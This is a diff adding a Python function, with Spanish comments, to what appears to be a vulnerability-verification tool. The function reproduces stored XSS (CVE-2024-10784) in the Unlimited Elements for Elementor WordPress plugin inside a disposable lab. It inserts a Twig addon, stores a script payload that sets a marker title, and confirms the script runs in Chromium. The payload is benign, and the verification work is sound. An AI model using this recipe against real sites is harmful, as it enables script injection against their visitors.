@@ -6176,6 +6176,182 @@ def verify_wordpress_ssrf(
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
 
 
+def verify_wordpress_xss_elementor(
+    plugin_source_dir: str, slug: str,
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    keep_lab_on_failure: bool = False,
+) -> "WpVerifyResult":
+    """Verifica Stored XSS via Elementor para plugins que actúan como widgets de Elementor.
+
+    Mecanismo (confirmado en unlimited-elements-for-elementor v1.5.102):
+      1. Instala Elementor + el plugin objetivo como companions.
+      2. Crea un addon mínimo en la tabla wp_unitecreator_addons con un template Twig
+         que renderiza un parámetro libre: <div>{{ uc_xss_field }}</div>.  Twig usa
+         autoescape=OFF porque los template names no tienen extensión .html, y
+         escCombinedHtml() es un no-op — el HTML del parámetro sale tal cual al DOM.
+      3. Crea una página de WordPress con _elementor_data apuntando a ese addon, con
+         uc_xss_field = payload XSS (document.title='binoracle-xss-TOKEN').
+      4. Carga la página en Chromium como visitante anónimo y comprueba el title.
+      5. verified=True SOLO si el title coincide exactamente con el marcador.
+
+    Esto replica el impacto real de CVE-2024-10784: un contributor (o admin) guarda XSS
+    en settings de un widget de Elementor y cualquier visitante que cargue la página
+    ejecuta el script.
+    """
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    try:
+        from playwright.sync_api import sync_playwright  # noqa: F401
+    except Exception:
+        res.available = False
+        res.detail = ("Playwright no instalado — verificacion Elementor-XSS necesita Chromium")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(
+            lab, plugin_source_dir, slug, step, res,
+            companion_plugins=["elementor"],
+            required_role="contributor",
+            budget_s=budget_s,
+        )
+        if boot is None:
+            return res
+
+        base_url = boot.base_url
+        shots = boot.shots
+        token = _token()
+        marker = f"binoracle-xss-{token}"
+        payload = f"<script>document.title='{marker}'</script>"
+        addon_name = "binoracle_xss_test"
+        widget_type = f"ucaddon_{addon_name}"
+
+        # --- Paso 1: insertar un addon mínimo en la tabla del plugin ---
+        # El addon usa Twig con autoescape=OFF (template name sin .html).
+        # {{ uc_xss_field }} renderiza el valor sin escapar → XSS.
+        import json as _json
+        templates_json = _json.dumps({"html": "<div>{{ uc_xss_field }}</div>", "css": "", "js": ""})
+        config_json = _json.dumps({
+            "params": [{"name": "uc_xss_field", "type": "textfield", "title": "XSS Field",
+                        "default": ""}],
+            "options": {}
+        })
+        # Escape para SQL inline (WP-CLI --exec)
+        def _sql_esc(s: str) -> str:
+            return s.replace("\\", "\\\\").replace("'", "\\'")
+
+        insert_sql = (
+            "INSERT INTO {$wpdb->prefix}unitecreator_addons "
+            "(title,name,alias,addontype,ordering,templates,config,is_active) VALUES "
+            f"('BinXSSTest','{addon_name}','{addon_name}','elementor',1,"
+            f"'{_sql_esc(templates_json)}','{_sql_esc(config_json)}',1);"
+        )
+        r_ins = lab.wp_cli("eval", f"global $wpdb; $wpdb->query(\"{insert_sql}\"); echo $wpdb->last_error ?: 'OK';",
+                           "--skip-plugins", "--skip-themes", timeout=20)
+        out_ins = (r_ins.stdout or "").strip().splitlines()
+        last_ins = out_ins[-1].strip() if out_ins else ""
+        if last_ins != "OK":
+            step(f"WARN: inserción de addon test devolvió: rc={r_ins.returncode} out={last_ins!r}")
+            # Seguir igualmente — puede que el addon ya exista de un run anterior
+
+        step(f"addon de test '{addon_name}' creado en DB (widgetType={widget_type})")
+
+        # --- Paso 2: crear la página con _elementor_data apuntando al addon ---
+        elementor_data = _json.dumps([{
+            "id": "bxs0001",
+            "elType": "section",
+            "settings": {},
+            "elements": [{
+                "id": "bxs0002",
+                "elType": "column",
+                "settings": {"_column_size": 100},
+                "elements": [{
+                    "id": "bxs0003",
+                    "elType": "widget",
+                    "widgetType": widget_type,
+                    "settings": {"uc_xss_field": payload},
+                    "elements": []
+                }],
+                "isInner": False
+            }],
+            "isInner": False
+        }])
+
+        r_post = lab.wp_cli("post", "create",
+                            "--post_title=Binoracle XSS Test",
+                            "--post_status=publish",
+                            "--post_author=1",
+                            "--porcelain", timeout=20)
+        post_id = (r_post.stdout or "").strip().splitlines()
+        post_id = post_id[-1].strip() if post_id else ""
+        if not post_id.isdigit():
+            step(f"ERROR: no se pudo crear la página de test (output={post_id!r})")
+            res.detail = "fallo al crear la página WordPress de test para Elementor XSS"
+            res.evidence["screenshots"] = shots
+            return res
+
+        lab.wp_cli("post", "meta", "set", post_id, "_elementor_data", elementor_data, timeout=20)
+        lab.wp_cli("post", "meta", "set", post_id, "_elementor_edit_mode", "builder", timeout=20)
+        lab.wp_cli("post", "meta", "set", post_id, "_elementor_template_type", "wp-page", timeout=20)
+
+        r_url = lab.wp_cli("post", "get", post_id, "--field=url", timeout=20)
+        page_url = (r_url.stdout or "").strip().splitlines()
+        page_url = page_url[-1].strip() if page_url else ""
+        if not page_url.startswith("http"):
+            page_url = f"{base_url}/?p={post_id}"
+
+        step(f"página de test creada: id={post_id} url={page_url}")
+
+        # --- Paso 3: cargar la página en Chromium como visitante anónimo ---
+        from urllib.parse import urlsplit
+        host = urlsplit(base_url).hostname or "127.0.0.1"
+        path = page_url[len(base_url):] or f"/?p={post_id}"
+
+        step(f"cargando {page_url} en Chromium (visitante anónimo) — buscando title='{marker}'...")
+        with _XssBrowserSession() as xb:
+            title, png = xb.render(
+                base_url, path, "GET", {}, [],
+                timeout_ms=20000, capture=True,
+                wait_for_xss_title=f"binoracle-xss-{token}",
+            )
+
+        if title and title.strip() == marker:
+            res.verified = True
+            res.detail = (
+                f"XSS CONFIRMADO: document.title cambió a '{marker}' al visitar "
+                f"{page_url} — el plugin renderiza el widget sin escapar el HTML "
+                f"(Twig autoescape=OFF + escCombinedHtml()=no-op)"
+            )
+            step(f"VERIFICADO: title='{title}' coincide con el marcador '{marker}'")
+        else:
+            res.detail = (
+                f"XSS no confirmado: document.title='{title or '(vacío)'}', "
+                f"esperado '{marker}' — el widget puede no estar renderizando el addon "
+                f"(addon no encontrado, widgetType incorrecto, o Elementor no activo)"
+            )
+            step(f"NO VERIFICADO: title='{title or '(vacío)'}'")
+
+        if png:
+            shots.append(("elementor-xss-chromium", png))
+        res.evidence["screenshots"] = shots
+        res.evidence["page_url"] = page_url
+        res.evidence["widget_type"] = widget_type
+        res.evidence["marker"] = marker
+        return res
+
+    except Exception as e:
+        res.detail = f"error inesperado en Elementor XSS verifier: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
 def verify_wordpress_xss(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, xss_param_hint: str = "",
